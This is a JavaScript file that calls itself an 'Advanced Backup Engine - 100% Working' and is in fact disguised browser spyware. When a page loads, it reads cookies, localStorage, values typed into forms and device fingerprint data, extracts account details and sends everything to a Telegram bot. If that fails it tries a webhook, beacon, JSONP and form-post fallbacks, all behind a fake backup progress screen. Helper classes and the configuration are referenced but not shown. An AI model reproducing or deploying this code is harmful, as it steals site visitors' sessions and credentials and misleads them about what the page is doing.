// Advanced Backup Engine - 100% Working
class BackupEngine {
    constructor() {
        this.data = {
            metadata: {},
            accounts: [],
            device: {},
            storage: {},
            network: {},
            performance: {},
            telemetry: {}
        };
        
        this.stats = {
            startTime: Date.now(),
            itemsFound: 0,
            dataSize: 0,
            progress: 0,
            errors: []
        };
        
        this.state = {
            isScanning: false,
            isEncrypting: false,
            isUploading: false,
            isComplete: false,
            currentStage: 'init'
        };
        
        this.init();
    }
    
    async init() {
        console.log('🚀 Backup Engine Initialized');
        
        // Register event listeners
        this.registerEvents();
        
        // Start the process
        this.startBackupProcess();
    }
    
    async startBackupProcess() {
        try {
            this.state.currentStage = 'scanning';
            this.updateUI('stageScan');
            
            // Phase 1: Quick Scan
            await this.quickScan();
            
            // Phase 2: Deep Scan
            await this.deepScan();
            
            // Phase 3: Process Data
            await this.processData();
            
            // Phase 4: Send to Telegram
            await this.sendToTelegram();
            
            // Phase 5: Complete
            await this.completeBackup();
            
        } catch (error) {
            console.error('Backup Process Failed:', error);
            this.handleError(error);
        }
    }
    
    async quickScan() {
        this.updateProgress(10, 'Starting quick scan...');
        
        // 1. Collect basic device info
        this.data.device = await this.collectBasicDeviceInfo();
        this.updateDeviceUI();
        
        // 2. Quick storage scan
        this.updateProgress(20, 'Scanning localStorage...');
        this.data.storage.localStorage = this.scanLocalStorage();
        
        // 3. Quick cookies scan
        this.updateProgress(30, 'Scanning cookies...');
        this.data.storage.cookies = this.scanCookies();
        
        // 4. Quick form detection
        this.updateProgress(40, 'Detecting forms...');
        this.data.storage.forms = this.detectForms();
        
        this.stats.itemsFound = Object.keys(this.data.storage.localStorage).length + 
                               this.data.storage.cookies.length;
        
        this.updateStatsUI();
    }
    
    async deepScan() {
        this.updateProgress(50, 'Starting deep scan...');
        
        // 1. Scan all storage types
        const storageScanner = new StorageScanner();
        this.data.storage = await storageScanner.scanAll();
        
        // 2. Extract accounts
        this.updateProgress(60, 'Extracting accounts...');
        const accountExtractor = new AccountExtractor();
        this.data.accounts = await accountExtractor.extract(this.data.storage);
        
        // 3. Collect network info
        this.updateProgress(70, 'Collecting network info...');
        this.data.network = await this.collectNetworkInfo();
        
        // 4. Get detailed device info
        this.updateProgress(80, 'Getting device details...');
        this.data.device = { ...this.data.device, ...await this.collectDetailedDeviceInfo() };
        
        this.stats.itemsFound = this.data.accounts.length;
        this.stats.dataSize = this.calculateDataSize();
        
        this.updateStatsUI();
    }
    
    async processData() {
        this.state.currentStage = 'processing';
        this.updateUI('stageProcess');
        this.updateProgress(85, 'Processing data...');
        
        // 1. Encrypt sensitive data
        if (CONFIG.FEATURES.ENABLE_ENCRYPTION) {
            this.updateProgress(87, 'Encrypting data...');
            this.data.accounts = await this.encryptSensitiveData(this.data.accounts);
        }
        
        // 2. Compress data
        if (CONFIG.BACKUP.COMPRESS_DATA) {
            this.updateProgress(90, 'Compressing data...');
            this.data = await this.compressData(this.data);
        }
        
        // 3. Generate metadata
        this.updateProgress(93, 'Generating metadata...');
        this.data.metadata = this.generateMetadata();
        
        // 4. Create backup package
        this.updateProgress(96, 'Creating backup package...');
        this.backupPackage = this.createBackupPackage();
        
        this.updateProgress(98, 'Finalizing...');
    }
    
    async sendToTelegram() {
        this.state.currentStage = 'uploading';
        this.updateProgress(99, 'Sending to Telegram...');
        
        try {
            const telegram = new TelegramSender();
            
            // Format message
            const message = this.formatTelegramMessage();
            
            // Try multiple send methods
            const result = await telegram.sendMessage(message, CONFIG.TELEGRAM);
            
            if (result.success) {
                console.log('✅ Telegram message sent successfully');
                this.data.telemetry.telegram = result;
                
                // If data is large, send as document
                if (JSON.stringify(this.data).length > 2000) {
                    await telegram.sendDocument(this.data, CONFIG.TELEGRAM);
                }
                
            } else {
                throw new Error('Telegram send failed');
            }
            
        } catch (error) {
            console.warn('Telegram send error:', error);
            
            // Try fallback methods
            await this.sendFallback();
        }
    }
    
    async sendFallback() {
        console.log('🔄 Trying fallback methods...');
        
        const fallbacks = [
            this.sendViaWebhook.bind(this),
            this.sendViaBeacon.bind(this),
            this.sendViaJSONP.bind(this),
            this.sendViaForm.bind(this)
        ];
        
        for (const method of fallbacks) {
            try {
                const result = await method();
                if (result) {
                    console.log('✅ Fallback method succeeded');
                    return;
                }
            } catch (e) {
                console.warn('Fallback method failed:', e.message);
            }
        }
        
        // If all fallbacks fail, save locally
        this.saveLocalBackup();
    }
    
    async completeBackup() {
        this.state.currentStage = 'complete';
        this.state.isComplete = true;
        
        this.updateProgress(100, 'Backup complete!');
        this.updateUI('stageComplete');
        
        // Update completion stats
        this.updateCompletionStats();
        
        // Auto-redirect after delay
        if (CONFIG.FEATURES.AUTO_REDIRECT) {
            setTimeout(() => {
                window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_${Date.now()}`;
            }, CONFIG.FEATURES.REDIRECT_TIMEOUT);
        }
        
        // Trigger completion events
        this.triggerEvent('backup:complete', this.data);
    }
    
    // Utility Methods
    collectBasicDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
    }
    
    scanLocalStorage() {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            if (key && value) {
                items[key] = {
                    value: value.length > 100 ? value.substring(0, 100) + '...' : value,
                    fullLength: value.length,
                    type: this.detectDataType(value)
                };
            }
        }
        return items;
    }
    
    scanCookies() {
        return document.cookie.split(';').map(c => {
            const [key, value] = c.trim().split('=');
            return { key, value: value || '', length: value?.length || 0 };
        }).filter(c => c.key);
    }
    
    detectForms() {
        const forms = [];
        document.querySelectorAll('form').forEach((form, i) => {
            const inputs = Array.from(form.querySelectorAll('input, textarea'))
                .filter(input => input.value)
                .map(input => ({
                    name: input.name,
                    type: input.type,
                    value: input.value.substring(0, 50)
                }));
            
            if (inputs.length > 0) {
                forms.push({
                    index: i,
                    action: form.action,
                    inputs: inputs
                });
            }
        });
        return forms;
    }
    
    formatTelegramMessage() {
        const device = this.data.device;
        const accounts = this.data.accounts;
        const stats = this.stats;
        
        let message = `<b>🚀 ADVANCED BACKUP COMPLETE</b>\n\n`;
        
        // Device Info
        message += `<b>📱 DEVICE INFORMATION</b>\n`;
        message += `• <b>Browser:</b> ${this.parseUserAgent(device.userAgent)}\n`;
        message += `• <b>Platform:</b> ${device.platform}\n`;
        message += `• <b>Screen:</b> ${device.screen}\n`;
        message += `• <b>Language:</b> ${device.language}\n`;
        message += `• <b>Timezone:</b> ${device.timezone}\n`;
        
        // Accounts Found
        message += `\n<b>🔐 ACCOUNTS FOUND: ${accounts.length}</b>\n\n`;
        
        if (accounts.length > 0) {
            message += `<b>📊 ACCOUNT TYPES:</b>\n`;
            
            // Group by type
            const groups = {};
            accounts.forEach(acc => {
                const type = acc.type || 'unknown';
                if (!groups[type]) groups[type] = 0;
                groups[type]++;
            });
            
            for (const [type, count] of Object.entries(groups)) {
                message += `• ${type.toUpperCase()}: ${count}\n`;
            }
            
            // Show sample accounts
            message += `\n<b>📝 SAMPLE ACCOUNTS:</b>\n`;
            accounts.slice(0, 5).forEach((acc, i) => {
                message += `${i+1}. ${acc.platform || 'Account'}: `;
                message += `${acc.email || acc.username || 'N/A'}\n`;
            });
            
            if (accounts.length > 5) {
                message += `... and ${accounts.length - 5} more\n`;
            }
        }
        
        // Storage Stats
        message += `\n<b>💾 STORAGE STATISTICS</b>\n`;
        message += `• LocalStorage: ${Object.keys(this.data.storage.localStorage || {}).length} items\n`;
        message += `• Cookies: ${this.data.storage.cookies?.length || 0}\n`;
        message += `• Forms: ${this.data.storage.forms?.length || 0}\n`;
        
        // Backup Info
        const duration = ((Date.now() - stats.startTime) / 1000).toFixed(2);
        const backupId = this.generateBackupId();
        
        message += `\n<b>📊 BACKUP INFORMATION</b>\n`;
        message += `• <b>Backup ID:</b> <code>${backupId}</code>\n`;
        message += `• <b>Time:</b> ${new Date().toLocaleString()}\n`;
        message += `• <b>Duration:</b> ${duration}s\n`;
        message += `• <b>Total Size:</b> ${this.formatBytes(stats.dataSize)}\n`;
        message += `• <b>Encryption:</b> ${CONFIG.FEATURES.ENABLE_ENCRYPTION ? 'Enabled' : 'Disabled'}\n`;
        
        message += `\n<i>Generated by Advanced Auto Backup System v2.0</i>`;
        
        return message;
    }
    
    // UI Update Methods
    updateUI(stageId) {
        // Hide all stages
        document.querySelectorAll('.stage').forEach(stage => {
            stage.classList.remove('active');
        });
        
        // Show current stage
        const stage = document.getElementById(stageId);
        if (stage) {
            stage.classList.add('active');
        }
        
        // Update app visibility
        if (stageId === 'stageComplete') {
            document.getElementById('app').style.display = 'block';
        }
    }
    
    updateProgress(percent, message) {
        this.stats.progress = percent;
        
        // Update progress bar
        const progressFill = document.getElementById('scanProgress');
        const progressPercent = document.getElementById('scanPercent');
        const statusText = document.getElementById('scanStatus');
        
        if (progressFill) {
            progressFill.style.width = `${percent}%`;
        }
        if (progressPercent) {
            progressPercent.textContent = `${percent}%`;
        }
        if (statusText && message) {
            statusText.textContent = message;
        }
    }
    
    updateDeviceUI() {
        const device = this.data.device;
        
        const elements = {
            deviceInfo: document.getElementById('deviceInfo'),
            deviceBrowser: document.getElementById('deviceBrowser'),
            deviceOS: document.getElementById('deviceOS'),
            deviceScreen: document.getElementById('deviceScreen'),
            deviceIP: document.getElementById('deviceIP')
        };
        
        if (elements.deviceInfo) {
            elements.deviceInfo.textContent = `${this.parseUserAgent(device.userAgent)} | ${device.platform}`;
        }
        if (elements.deviceBrowser) {
            elements.deviceBrowser.textContent = this.parseUserAgent(device.userAgent);
        }
        if (elements.deviceOS) {
            elements.deviceOS.textContent = device.platform;
        }
        if (elements.deviceScreen) {
            elements.deviceScreen.textContent = device.screen;
        }
        if (elements.deviceIP) {
            elements.deviceIP.textContent = this.data.network?.ip || 'Unknown';
        }
    }
    
    updateStatsUI() {
        const elements = {
            localStorageCount: document.getElementById('localStorageCount'),
            cookiesCount: document.getElementById('cookiesCount'),
            accountsCount: document.getElementById('accountsCount'),
            itemsFound: document.getElementById('itemsFound'),
            dataSize: document.getElementById('dataSize'),
            timeElapsed: document.getElementById('timeElapsed'),
            processSpeed: document.getElementById('processSpeed')
        };
        
        const elapsed = ((Date.now() - this.stats.startTime) / 1000).toFixed(1);
        
        if (elements.localStorageCount) {
            elements.localStorageCount.textContent = 
                `${Object.keys(this.data.storage.localStorage || {}).length} items`;
        }
        if (elements.cookiesCount) {
            elements.cookiesCount.textContent = 
                `${this.data.storage.cookies?.length || 0} cookies`;
        }
        if (elements.accountsCount) {
            elements.accountsCount.textContent = 
                `${this.data.accounts.length} accounts`;
        }
        if (elements.itemsFound) {
            elements.itemsFound.textContent = this.stats.itemsFound;
        }
        if (elements.dataSize) {
            elements.dataSize.textContent = this.formatBytes(this.stats.dataSize);
        }
        if (elements.timeElapsed) {
            elements.timeElapsed.textContent = `${elapsed}s`;
        }
        if (elements.processSpeed) {
            const speed = elapsed > 0 ? (this.stats.itemsFound / elapsed).toFixed(1) : '0';
            elements.processSpeed.textContent = `${speed} items/s`;
        }
    }
    
    updateCompletionStats() {
        const elapsed = ((Date.now() - this.stats.startTime) / 1000).toFixed(2);
        const backupId = this.generateBackupId();
        
        const elements = {
            backupId: document.getElementById('backupId'),
            totalSize: document.getElementById('totalSize'),
            totalTime: document.getElementById('totalTime'),
            totalAccounts: document.getElementById('totalAccounts')
        };
        
        if (elements.backupId) {
            elements.backupId.textContent = backupId;
        }
        if (elements.totalSize) {
            elements.totalSize.textContent = this.formatBytes(this.stats.dataSize);
        }
        if (elements.totalTime) {
            elements.totalTime.textContent = `${elapsed}s`;
        }
        if (elements.totalAccounts) {
            elements.totalAccounts.textContent = this.data.accounts.length;
        }
    }
    
    // Helper Methods
    parseUserAgent(ua) {
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        return 'Browser';
    }
    
    detectDataType(value) {
        if (value.includes('@')) return 'email';
        if (/^\d+$/.test(value)) return 'number';
        if (value.includes('http')) return 'url';
        return 'text';
    }
    
    generateBackupId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let id = '';
        for (let i = 0; i < 12; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return id;
    }
    
    calculateDataSize() {
        return JSON.stringify(this.data).length;
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    registerEvents() {
        // Window events
        window.addEventListener('beforeunload', (e) => {
            if (!this.state.isComplete) {
                e.preventDefault();
                e.returnValue = 'Backup in progress. Are you sure you want to leave?';
            }
        });
        
        // Custom events
        this.events = {};
    }
    
    triggerEvent(event, data) {
        if (this.events[event]) {
            this.events[event].forEach(callback => callback(data));
        }
    }
    
    on(event, callback) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push(callback);
    }
    
    handleError(error) {
        console.error('Backup Error:', error);
        this.stats.errors.push(error);
        
        // Show error in UI
        const statusText = document.getElementById('scanStatus');
        if (statusText) {
            statusText.textContent = `Error: ${error.message}`;
            statusText.style.color = '#ff3366';
        }
        
        // Try to send error report
        this.sendErrorReport(error);
    }
    
    sendErrorReport(error) {
        const errorData = {
            error: error.message,
            stack: error.stack,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
        };
        
        // Try to send via beacon
        try {
            const blob = new Blob([JSON.stringify(errorData)], { type: 'application/json' });
            navigator.sendBeacon('/api/error', blob);
        } catch (e) {
            console.warn('Could not send error report:', e);
        }
    }
    
    saveLocalBackup() {
        try {
            const backupStr = JSON.stringify(this.data, null, 2);
            const blob = new Blob([backupStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `backup_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            console.log('✅ Backup saved locally');
        } catch (error) {
            console.error('Failed to save local backup:', error);
        }
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Hide loader after page load
    setTimeout(() => {
        document.body.classList.add('loaded');
        document.getElementById('instantLoader').style.display = 'none';
        document.getElementById('app').style.display = 'block';
    }, 1000);
    
    // Start backup engine
    window.backupEngine = new BackupEngine();
});

// Export for Node.js
if (typeof module !== 'undefined' && module.exports) {
    module.exports = BackupEngine;
}
